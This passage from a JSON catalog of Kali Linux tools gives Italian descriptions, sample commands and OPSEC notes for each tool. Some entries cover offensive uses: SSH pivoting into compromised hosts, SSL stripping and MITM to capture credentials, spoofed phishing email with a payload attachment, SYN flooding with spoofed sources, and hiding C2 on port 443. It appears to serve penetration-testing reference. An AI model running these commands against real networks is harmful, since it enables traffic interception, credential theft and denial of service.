d'uso</h4><p>Per <strong>malware analysis</strong>, raggruppa varianti della stessa famiglia. Per <strong>forensics</strong>, trova file modificati leggermente. Per <strong>threat intel</strong>, identifica relazioni tra samples.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>False Positives:</strong> similarità non implica stesso malware. <strong>Performance:</strong> confronto O(n²) su grandi dataset. <strong>Limitations:</strong> packed/encrypted files possono dare risultati errati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "sshuttle",
    "name": "sshuttle",
    "version": "1.3.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sshuttle/",
    "desc": "VPN over SSH trasparente: tunneling completo senza bisogno di configurazione server.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>sshuttle è una VPN trasparente over SSH che non richiede configurazione server. Usa Python e iptables per creare tunnel che instradano tutto il traffico attraverso la connessione SSH.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zero Config Server:</strong> richiede solo SSH e Python sul target</p><p><strong>Transparent Proxy:</strong> tutto il traffico passa per il tunnel</p><p><strong>Subnet Routing:</strong> instrada subnet specifiche</p><p><strong>DNS Forwarding:</strong> risolve DNS attraverso il tunnel</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Tunnel per subnet interna via jump host\nsshuttle -r user@jumphost 10.0.0.0/8 172.16.0.0/12 --dns\n\n# Full tunnel con esclusione host locale\nsshuttle -r user@jumphost 0/0 -x jumphost_ip/32 --python=/usr/bin/python3\n\n# Chain attraverso bastion con ProxyJump\nsshuttle -r user@internal -e 'ssh -J user@bastion' 192.168.0.0/16\n\n# Background daemon con autorestart\nsshuttle --daemon --pidfile=/tmp/sshuttle.pid -r user@jumphost 10.0.0.0/8 &amp;&amp; \\\n  echo \"Tunnel running, nmap interno possibile\"\n\n# Con chiave SSH e porta non standard\nsshuttle -r user@jumphost:2222 10.0.0.0/8 -e 'ssh -i ~/.ssh/pentest_key -o StrictHostKeyChecking=no'\n\n# Multipli subnet per pentest completo\nsshuttle -r root@pwned 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 --dns -v\n\n# Combine con proxychains per tool non supportati\nsshuttle -r user@jumphost 10.0.0.0/8 &amp;&amp; nmap -sT -Pn 10.0.0.0/24</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>pivoting</strong>, accede a reti interne via jump host. Per <strong>pentest</strong>, raggiungi subnet non direttamente accessibili. Per <strong>bypass firewall</strong>, tunnel attraverso SSH consentito.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>SSH Logs:</strong> connessione SSH visibile nei log. <strong>Traffic:</strong> tutto il traffico passa per l'host SSH. <strong>Permissions:</strong> richiede root locale per iptables.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "ssldump",
    "name": "ssldump",
    "version": "1.9",
    "icon": "../app/icons/ssldump-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ssldump/",
    "desc": "Analizza traffico SSL/TLS decodificando handshake e mostrando cipher negoziati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>ssldump è un analizzatore di protocollo SSL/TLS che decodifica traffico cifrato. Mostra dettagli dell'handshake, cipher negoziati, certificati e può decifrare traffico se fornita la chiave privata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Handshake Analysis:</strong> decodifica completa del TLS handshake</p><p><strong>Cipher Display:</strong> mostra suite crittografiche negoziate</p><p><strong>Certificate Extraction:</strong> visualizza certificati scambiati</p><p><strong>Decryption:</strong> decifra traffico con chiave privata</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cattura live su interfaccia\nssldump -i eth0 port 443\n\n# Da file pcap\nssldump -r capture.pcap\n\n# Mostra application data (con chiave)\nssldump -r capture.pcap -k server.key -d\n\n# Output dettagliato\nssldump -i eth0 -A -d port 443\n\n# Solo handshake\nssldump -i eth0 -H port 443</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>TLS debugging</strong>, analizza problemi di handshake. Per <strong>security audit</strong>, verifica cipher negoziati. Per <strong>forensics</strong>, ricostruisce sessioni TLS con chiave nota.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Decryption:</strong> richiede chiave privata del server. <strong>PFS:</strong> con ECDHE/DHE la chiave privata non basta. <strong>Legal:</strong> intercettazione traffico potrebbe essere illegale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "sslh",
    "name": "sslh",
    "version": "2.1.4",
    "icon": "../app/icons/sslh-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sslh/",
    "desc": "Multiplexer protocolli su singola porta: gestisce HTTPS, SSH, OpenVPN simultaneamente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>sslh è un multiplexer di protocolli che permette di servire diversi servizi (HTTPS, SSH, OpenVPN) su una singola porta. Analizza i primi byte della connessione per instradare al servizio corretto.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Protocol Detection:</strong> identifica SSL, SSH, OpenVPN, HTTP</p><p><strong>Single Port:</strong> tutti i servizi su porta 443</p><p><strong>Transparent:</strong> mantiene IP sorgente originale</p><p><strong>Fallback:</strong> default service per protocolli sconosciuti</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Multiplexing su porta 443\nsslh -p 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:4443 --openvpn 127.0.0.1:1194\n\n# Con configurazione file\nsslh -F /etc/sslh.cfg\n\n# Foreground con verbose\nsslh -f -v --listen 0.0.0.0:443 --ssh localhost:22 --tls localhost:443</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>firewall bypass</strong>, tunnela SSH/VPN su porta 443 consentita. Per <strong>stealth C2</strong>, nasconde traffico C2 su porta HTTPS. Per <strong>restricted networks</strong>, aggira blocchi su porte non standard.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>DPI:</strong> deep packet inspection può rilevare multiplexing. <strong>Timing:</strong> handshake analysis può rivelare il vero protocollo. <strong>Forensics:</strong> pattern di traffico anomalo su 443.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "sslscan",
    "name": "sslscan",
    "version": "2.1.5",
    "icon": "../app/icons/sslscan-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sslscan/",
    "desc": "Testa configurazione SSL/TLS: cipher, protocolli, certificati e vulnerabilità note.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>sslscan è uno scanner per analizzare configurazioni SSL/TLS di server. Enumera cipher supportati, versioni protocollo, dettagli certificato e identifica configurazioni insicure o vulnerabilità note.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cipher Enumeration:</strong> lista tutti i cipher supportati</p><p><strong>Protocol Testing:</strong> verifica SSLv2/v3, TLS 1.0/1.1/1.2/1.3</p><p><strong>Vulnerability Check:</strong> Heartbleed, POODLE, etc.</p><p><strong>Certificate Analysis:</strong> dettagli cert, chain, expiry</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base\nsslscan target.com\n\n# Con porta specifica\nsslscan target.com:8443\n\n# Output XML\nsslscan --xml=output.xml target.com\n\n# Solo cipher deboli\nsslscan --show-cipher-ids target.com\n\n# STARTTLS per SMTP\nsslscan --starttls-smtp mail.target.com:25</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>security audit</strong>, valuta configurazione TLS. Per <strong>compliance</strong>, verifica requisiti PCI-DSS. Per <strong>vulnerability assessment</strong>, identifica cipher deboli e protocolli obsoleti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> connessioni TLS loggabili dal server. <strong>Detection:</strong> enumeration pattern riconoscibile. <strong>Rate:</strong> molte connessioni in breve tempo sono sospette.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "sslsniff",
    "name": "sslsniff",
    "version": "0.8",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sslsniff/",
    "desc": "MITM su connessioni SSL generando certificati on-the-fly per intercettazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>sslsniff è uno strumento per attacchi MITM su connessioni SSL/TLS. Genera certificati al volo firmati da una CA controllata dall'attaccante per intercettare traffico cifrato in chiaro.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dynamic Certs:</strong> genera certificati on-the-fly</p><p><strong>CA Spoofing:</strong> firma con CA controllata</p><p><strong>Traffic Logging:</strong> salva traffico decifrato</p><p><strong>Targeted Mode:</strong> intercetta solo domini specifici</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Setup con CA certificate\nsslsniff -a -c ca.crt -k ca.key -s 8443 -w log.txt\n\n# Modalità targeted\nsslsniff -a -c ca.crt -k ca.key -t targetlist.txt -s 8443\n\n# Con specificità certificato\nsslsniff -a -c ca.crt -k ca.key -m IPSCACLASEA1.crt -s 8443\n\n# Redirect con iptables\niptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>traffic interception</strong>, cattura credenziali in sessioni HTTPS. Per <strong>malware analysis</strong>, analizza comunicazioni C2 cifrate. Per <strong>corporate security</strong>, DLP su traffico cifrato (con certificato aziendale).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Certificate Warning:</strong> browser moderni mostrano warning per CA non trusted. <strong>HSTS:</strong> siti con HSTS sono più difficili da intercettare. <strong>Pinning:</strong> certificate pinning blocca l'attacco.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "sslsplit",
    "name": "sslsplit",
    "version": "0.5.5",
    "icon": "../app/icons/sslsplit-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sslsplit/",
    "desc": "Proxy MITM trasparente per intercettazione SSL/TLS con forging certificati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SSLsplit è un proxy MITM trasparente per intercettazione di connessioni SSL/TLS e STARTTLS. Genera certificati forgiati al volo permettendo di ispezionare traffico cifrato in clear text.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Transparent Proxy:</strong> opera senza configurazione client</p><p><strong>Cert Forging:</strong> genera certificati firmati da CA custom</p><p><strong>STARTTLS Support:</strong> intercetta upgrade TLS su SMTP, IMAP</p><p><strong>Connection Logging:</strong> salva tutto il traffico decifrato</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># MITM base con CA\nsslsplit -D -l connections.log -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443\n\n# Con NAT redirect\niptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443\n\n# Multipli protocolli\nsslsplit -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080\n\n# Con logging completo\nsslsplit -D -M logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>network forensics</strong>, analizza traffico cifrato aziendale. Per <strong>pentest</strong>, intercetta credenziali in ambiente controllato. Per <strong>malware analysis</strong>, decodifica C2 communications.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Certificate Pinning:</strong> app con pinning rifiutano connessione. <strong>HPKP:</strong> browser ricordano pin precedenti. <strong>Detection:</strong> cambio certificato rilevabile da utenti attenti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "sslstrip",
    "name": "sslstrip",
    "version": "1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sslstrip/",
    "desc": "Downgrade HTTPS a HTTP per intercettare credenziali in chiaro su reti locali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>sslstrip è uno strumento per attacchi SSL stripping che effettua downgrade da HTTPS a HTTP. Intercetta redirect HTTPS e sostituisce i link, permettendo di catturare credenziali in chiaro.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SSL Stripping:</strong> rimuove upgrade HTTPS dal traffico</p><p><strong>Credential Capture:</strong> logga form submissions in chiaro</p><p><strong>Link Rewriting:</strong> converte https:// in http://</p><p><strong>Favicon Spoofing:</strong> mostra lucchetto falso</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Setup NAT redirect\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000\n\n# Avvia sslstrip\nsslstrip -l 10000 -w log.txt\n\n# Con favicon spoofing\nsslstrip -l 10000 -f -w log.txt\n\n# Abilita IP forwarding\necho 1 > /proc/sys/net/ipv4/ip_forward</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>credential theft</strong>, cattura password su reti locali. Per <strong>awareness training</strong>, dimostra rischi di HTTP. Per <strong>pentest interno</strong>, testa utenti su reti non segmentate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>HSTS:</strong> browser con HSTS preload sono immuni. <strong>Browser Warnings:</strong> utenti attenti notano mancanza lucchetto. <strong>Detection:</strong> IDS può rilevare downgrade.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "sslyze",
    "name": "sslyze",
    "version": "6.2.0",
    "icon": "../app/icons/sslyze-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sslyze/",
    "desc": "Scanner SSL/TLS veloce e completo con output JSON per automazione security audit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SSLyze è uno scanner SSL/TLS veloce e completo scritto in Python. Offre output JSON strutturato ideale per automazione, supporta scan paralleli e verifica conformità a standard come Mozilla Observatory.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fast Scanning:</strong> scansioni parallele multi-thread</p><p><strong>JSON Output:</strong> output strutturato per automazione</p><p><strong>Compliance Check:</strong> verifica Mozilla, PCI-DSS guidelines</p><p><strong>Certificate Validation:</strong> chain completa, OCSP, CT logs</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo\nsslyze target.com\n\n# Output JSON\nsslyze --json_out=result.json target.com\n\n# Scan multipli host\nsslyze --targets_in=hosts.txt\n\n# Solo vulnerabilità\nsslyze --heartbleed --robot --openssl_ccs target.com\n\n# Mozilla compliance\nsslyze --mozilla_config=modern target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>CI/CD integration</strong>, verifica automatica TLS in pipeline. Per <strong>compliance audit</strong>, report JSON per documentazione. Per <strong>mass scanning</strong>, analisi rapida di molti endpoint.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Scanning:</strong> genera traffico identificabile come security scan. <strong>Rate:</strong> scan veloci possono triggerare rate limiting. <strong>Logging:</strong> connessioni loggabili dal target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "subfinder",
    "name": "subfinder",
    "version": "2.6.0",
    "icon": "../app/icons/subfinder-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/subfinder/",
    "desc": "Enumera subdomain passivamente usando decine di fonti: Shodan, Censys, VirusTotal.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Subfinder è uno strumento per subdomain enumeration passiva sviluppato da ProjectDiscovery. Interroga decine di fonti (Shodan, Censys, VirusTotal, SecurityTrails) senza contattare direttamente il target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Passive Recon:</strong> nessun traffico verso il target</p><p><strong>Multiple Sources:</strong> 50+ fonti di dati integrate</p><p><strong>API Keys:</strong> supporta chiavi per fonti premium</p><p><strong>Output Formats:</strong> JSON, text, stdout per pipeline</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumeration base\nsubfinder -d target.com\n\n# Output su file\nsubfinder -d target.com -o subdomains.txt\n\n# Multipli domini\nsubfinder -dL domains.txt\n\n# Solo fonti specifiche\nsubfinder -d target.com -sources shodan,censys\n\n# JSON output\nsubfinder -d target.com -json -o output.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>bug bounty</strong>, scopre asset per testing. Per <strong>attack surface mapping</strong>, identifica tutti i subdomain. Per <strong>passive recon</strong>, raccoglie info senza alertare il target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive:</strong> non genera traffico verso il target. <strong>API Logging:</strong> query loggate dai provider. <strong>Data Freshness:</strong> risultati potrebbero essere datati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "subjack",
    "name": "subjack",
    "version": "2.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/subjack/",
    "desc": "Rileva subdomain takeover su servizi cloud: S3, Heroku, GitHub Pages, Azure.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Subjack è uno scanner per subdomain takeover che identifica CNAME pendenti verso servizi cloud non reclamati. Supporta AWS S3, Heroku, GitHub Pages, Azure, Shopify e molti altri provider.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Provider:</strong> supporta 30+ servizi cloud</p><p><strong>CNAME Detection:</strong> identifica record DNS pendenti</p><p><strong>Fingerprinting:</strong> verifica response per confermare takeover</p><p><strong>Fast Scanning:</strong> scansione parallela ad alte prestazioni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan lista subdomain\nsubjack -w subdomains.txt\n\n# Con threads\nsubjack -w subdomains.txt -t 100\n\n# Output risultati\nsubjack -w subdomains.txt -o results.txt\n\n# Con SSL verification\nsubjack -w subdomains.txt -ssl\n\n# Verbose mode\nsubjack -w subdomains.txt -v</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>bug bounty</strong>, trova subdomain takeover per reward. Per <strong>security audit</strong>, verifica che CNAME siano tutti attivi. Per <strong>attack surface</strong>, identifica rischi da servizi dismessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>DNS Queries:</strong> genera traffico DNS identificabile. <strong>False Positives:</strong> verificare manualmente prima di reporting. <strong>Legal:</strong> il takeover effettivo richiede autorizzazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "sublist3r",
    "name": "sublist3r",
    "version": "1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sublist3r/",
    "desc": "Enumera subdomain usando motori di ricerca e servizi come Netcraft, DNSdumpster.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Sublist3r è uno strumento Python per subdomain enumeration che utilizza motori di ricerca (Google, Bing, Yahoo) e servizi specializzati (Netcraft, DNSdumpster, VirusTotal) per scoprire subdomain.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Search Engines:</strong> query su Google, Bing, Yahoo, Baidu</p><p><strong>DNS Services:</strong> Netcraft, DNSdumpster, ThreatCrowd</p><p><strong>Brute Force:</strong> opzionale con subbrute integrato</p><p><strong>Port Scanning:</strong> verifica porte su subdomain trovati</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumeration base\nsublist3r -d target.com\n\n# Output su file\nsublist3r -d target.com -o subdomains.txt\n\n# Con brute force\nsublist3r -d target.com -b\n\n# Threads per brute force\nsublist3r -d target.com -b -t 50\n\n# Con port scan\nsublist3r -d target.com -p 80,443,8080</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>reconnaissance</strong>, mappa subdomain di un target. Per <strong>bug bounty</strong>, scopre asset nel scope. Per <strong>penetration testing</strong>, identifica punti di ingresso aggiuntivi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Rate Limits:</strong> motori di ricerca possono bloccare. <strong>Detection:</strong> brute force genera traffico DNS. <strong>Captchas:</strong> query eccessive triggerano captcha.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "swaks",
    "name": "swaks",
    "version": "20240103.0",
    "icon": "../app/icons/swaks-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/swaks/",
    "desc": "Swiss Army Knife SMTP: test mail server, relay, auth, TLS con massima flessibilità.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Swaks (Swiss Army Knife for SMTP) è uno strumento flessibile per testing di server SMTP. Permette di testare relay, autenticazione, TLS, e inviare email personalizzate per verifiche di sicurezza.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SMTP Testing:</strong> test completo di funzionalità server</p><p><strong>Auth Support:</strong> PLAIN, LOGIN, CRAM-MD5, NTLM</p><p><strong>TLS/STARTTLS:</strong> test encryption options</p><p><strong>Custom Headers:</strong> crafting completo email</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test invio base\nswaks --to victim@target.com --from attacker@domain.com --server mail.target.com\n\n# Con autenticazione\nswaks --to user@target.com --server mail.target.com --auth LOGIN --auth-user user --auth-password pass\n\n# STARTTLS\nswaks --to user@target.com --server mail.target.com --tls\n\n# Con attachment\nswaks --to user@target.com --attach payload.pdf --server mail.target.com\n\n# Spoofed header\nswaks --to victim@target.com --from ceo@company.com --header \"Subject: Urgent\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>relay testing</strong>, verifica open relay. Per <strong>phishing simulation</strong>, testa invio email spoofate. Per <strong>mail server audit</strong>, valuta configurazioni di sicurezza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> tutte le email loggabili. <strong>SPF/DKIM:</strong> email spoofate possono essere rifiutate/marcate. <strong>Traceability:</strong> IP mittente visibile negli header.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "t50",
    "name": "t50",
    "version": "5.8.7b",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/t50/",
    "desc": "Generatore di pacchetti multi-protocollo per stress test e network flooding.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>T50 è un generatore di pacchetti multi-protocollo ad alte prestazioni per stress testing di rete. Supporta oltre 15 protocolli e può generare milioni di pacchetti al secondo per testare resilienza di infrastrutture.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Protocol:</strong> TCP, UDP, ICMP, IGMP, GRE, IPSec, etc.</p><p><strong>High Performance:</strong> milioni di pps con raw sockets</p><p><strong>Packet Crafting:</strong> personalizzazione completa header</p><p><strong>Flooding Modes:</strong> SYN flood, UDP flood, mixed</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># SYN flood\nt50 192.168.1.100 --flood -S --dport 80\n\n# Multi-protocol flood\nt50 192.168.1.100 --flood --protocol TCP,UDP,ICMP\n\n# Con source spoofing\nt50 192.168.1.100 --flood --saddr random\n\n# Burst mode\nt50 192.168.1.100 --turbo --dport 443</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>stress testing</strong>, valuta capacità dell'infrastruttura. Per <strong>DDoS simulation</strong>, testa protezioni anti-DoS. Per <strong>firewall testing</strong>, verifica handling di traffico anomalo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Authorization:</strong> SOLO su sistemi propri/autorizzati. <strong>Impact:</strong> può causare denial of service reale. <strong>Legal:</strong> flooding non autorizzato è reato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "tcpdump",
    "name": "tcpdump",
    "version": "4.99.5",
    "icon": "../app/icons/tcpdump-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/tcpdump/",
    "desc": "Sniffer di rete classico a riga di comando per cattura e analisi pacchetti live.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>tcpdump è lo sniffer di rete CLI di riferimento per sistemi Unix. Cattura e analizza pacchetti in tempo reale con potenti filtri BPF (Berkeley Packet Filter) e salva in formato pcap per analisi successive.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Packet Capture:</strong> cattura traffico su qualsiasi interfaccia</p><p><strong>BPF Filters:</strong> filtri potenti per traffico specifico</p><p><strong>PCAP Output:</strong> salvataggio per Wireshark</p><p><strong>Protocol Decode:</strong> decodifica header layer 2-7</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cattura su interfaccia\ntcpdump -i eth0\n\n# Filtra per host\ntcpdump -i eth0 host 192.168.1.100\n\n# Filtra per porta\ntcpdump -i eth0 port 80\n\n# Salva in file pcap\ntcpdump -i eth0 -w capture.pcap\n\n# Mostra contenuto pacchetti\ntcpdump -i eth0 -A -s0 port 80\n\n# Leggi da file\ntcpdump -r capture.pcap</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>network debugging</strong>, analizza problemi di connettività. Per <strong>security monitoring</strong>, cattura traffico sospetto. Per <strong>forensics</strong>, registra evidence di attività network.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Permissions:</strong> richiede root o capability CAP_NET_RAW. <strong>Legal:</strong> cattura traffico altrui può essere illegale. <strong>Storage:</strong> catture prolungate occupano molto spazio.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "tcpreplay",
    "name": "tcpreplay",
    "version": "4.5.1",
    "icon": "../app/icons/tcpreplay-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/tcpreplay/",
    "desc": "Riproduce catture pcap su rete per test IDS/IPS e replay di attacchi registrati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>tcpreplay è una suite per riprodurre traffico di rete da file pcap. Permette di reiniettare catture su interfacce di rete per testare IDS/IPS, firewall e verificare detection di attacchi noti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Traffic Replay:</strong> ritrasmette pcap su interfaccia</p><p><strong>Speed Control:</strong> modifica velocità di replay</p><p><strong>Packet Editing:</strong> tcprewrite per modifiche IP/MAC</p><p><strong>Bidirectional:</strong> replay su due interfacce simultanee</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Replay base\ntcpreplay -i eth0 capture.pcap\n\n# Replay alla velocità originale\ntcpreplay -i eth0 --topspeed capture.pcap\n\n# Modifica velocità (10x)\ntcpreplay -i eth0 --multiplier=10 capture.pcap\n\n# Loop infinito\ntcpreplay -i eth0 --loop=0 capture.pcap\n\n# Modifica IP prima del replay\ntcprewrite --infile=original.pcap --outfile=modified.pcap --srcipmap=10.0.0.0/8:192.168.0.0/16</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>IDS testing</strong>, verifica detection di attacchi noti. Per <strong>network testing</strong>, stress test con traffico reale. Per <strong>SOC training</strong>, genera alert realistici per esercitazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Network Impact:</strong> può influenzare traffico di produzione. <strong>Detection:</strong> replay può essere identificato da timestamp. <strong>Authorization:</strong> usare solo su reti di test.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "teamsploit",
    "name": "teamsploit",
    "version": "0~20151123",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/teamsploit/",
    "desc": "Wrapper Metasploit per collaborazione multi-utente su engagement di team.",
